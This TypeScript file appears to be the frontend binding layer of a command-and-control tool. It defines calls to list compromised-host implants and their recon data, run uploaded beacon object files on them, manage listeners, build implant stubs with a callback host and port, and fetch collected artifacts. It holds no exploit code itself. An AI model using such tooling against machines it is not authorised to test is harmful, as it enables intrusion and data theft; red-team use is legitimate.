/**
 * Thin, typed shim over the Wails-generated bindings.
 *
 * We access `window.go.main.App.*` and `window.runtime.EventsOn` dynamically
 * instead of statically importing `../wailsjs/...` so the frontend builds even
 * when the `wailsjs/` directory hasn't been (re)generated (e.g. a plain
 * `npm run build` outside `wails dev`). In real desktop mode these are always
 * present; in browser/demo mode this module is never called.
 */

export interface WailsImplant {
  id: number
  addr: string
  since: number
  last_seen: number
  // Recon fields from the auto-run sysinfo BOF (empty until it reports back).
  internal_ip?: string
  external_ip?: string
  user?: string
  computer?: string
  process_name?: string
  pid?: string
  os?: string
  os_build?: string
  arch?: string
  online_time?: string
}

export interface WailsBofEntry {
  name: string
  size: number
}

export interface WailsTaskResult {
  id: string
  status: string // "running" | "completed" | "failed"
  output: string
}

export interface WailsCoreEvent {
  type: string // implant_connected | implant_disconnected | hello | output | error
  implant_id: number
  data: string
}

const w = (): any => window as any

const app = (): any => w()?.go?.main?.App

/** True when the Wails Go bindings are injected (desktop runtime). */
export function wailsReady(): boolean {
  return !!app()
}

export async function Login(username: string, password: string): Promise<string> {
  return app().Login(username, password)
}

export async function ListImplants(): Promise<WailsImplant[]> {
  return app().ListImplants()
}

export async function ListBofs(): Promise<WailsBofEntry[]> {
  return app().ListBofs()
}

export async function RunBofByName(id: number, bofName: string, argsB64: string): Promise<string> {
  return app().RunBofByName(id, bofName, argsB64)
}

export async function RunBofByB64(id: number, cofB64: string, argsB64: string): Promise<string> {
  return app().RunBofByB64(id, cofB64, argsB64)
}

export async function GetTaskResult(taskID: string): Promise<WailsTaskResult> {
  return app().GetTaskResult(taskID)
}

export async function Hello(id: number): Promise<void> {
  return app().Hello(id)
}

export async function DropImplant(id: number): Promise<void> {
  return app().DropImplant(id)
}

export async function UploadBof(name: string, cofB64: string): Promise<void> {
  return app().UploadBof(name, cofB64)
}

// ---- Listeners ----

export interface WailsListener {
  id: string
  name: string
  protocol: string
  bind_ip: string
  port: string
  active: boolean
  created_ts: number
}

export async function ListListeners(): Promise<WailsListener[]> {
  return app().ListListeners()
}

export async function CreateListener(name: string, bindIP: string, port: string): Promise<WailsListener> {
  return app().CreateListener(name, bindIP, port)
}

export async function UpdateListener(id: string, name: string, bindIP: string, port: string): Promise<void> {
  return app().UpdateListener(id, name, bindIP, port)
}

export async function ToggleListener(id: string, start: boolean): Promise<void> {
  return app().ToggleListener(id, start)
}

export async function DeleteListener(id: string): Promise<void> {
  return app().DeleteListener(id)
}

// ---- Stub builder ----

export async function BuildStub(host: string, port: string): Promise<string> {
  return app().BuildStub(host, port) // returns base64 exe bytes
}

// BuildStubToProject patches the implant exe via the core, then pops the OS
// "Save As" dialog so the operator picks where to save it. Returns {path} —
// path is "" if the operator cancelled. No browser blob download.
export async function BuildStubToProject(host: string, port: string, name: string): Promise<{ path: string }> {
  const s = await app().BuildStubToProject(host, port, name)
  return JSON.parse(s)
}

// ---- Logs (persisted) ----

export interface WailsLogEntry {
  id: number
  ts: number
  implant_id: number
  type: string
  data: string
}

export async function GetLogs(limit: number, implantID: number): Promise<WailsLogEntry[]> {
  return app().GetLogs(limit, implantID)
}

// ---- Agents + artifacts ----

export interface WailsAgent {
  implant_id: number
  first_seen: number
  last_seen: number
  addr: string
  note: string
  online: boolean
}

export interface WailsArtifact {
  id: number
  ts: number
  implant_id: number
  kind: string
  path?: string
  meta?: string
  has_blob: boolean
}

export async function ListAgents(): Promise<WailsAgent[]> {
  return app().ListAgents()
}

export async function ListArtifacts(implantID: number, kind: string, limit: number): Promise<WailsArtifact[]> {
  return app().ListArtifacts(implantID, kind, limit)
}

// GetArtifact returns [kind, b64?, meta?] — blob kinds give b64, text kinds give meta.
export async function GetArtifact(implantID: number, aid: number): Promise<[string, string, string]> {
  return app().GetArtifact(implantID, aid)
}

/** Subscribe to a Wails event. Returns an unsubscribe function. */
export function wailsEventsOn(eventName: string, cb: (e: WailsCoreEvent) => void): () => void {
  const runtime = w()?.runtime
  if (runtime?.EventsOn) {
    runtime.EventsOn(eventName, cb)
    return () => {
      try { runtime.EventsOff?.(eventName) } catch { /* ignore */ }
    }
  }
  return () => {}
}
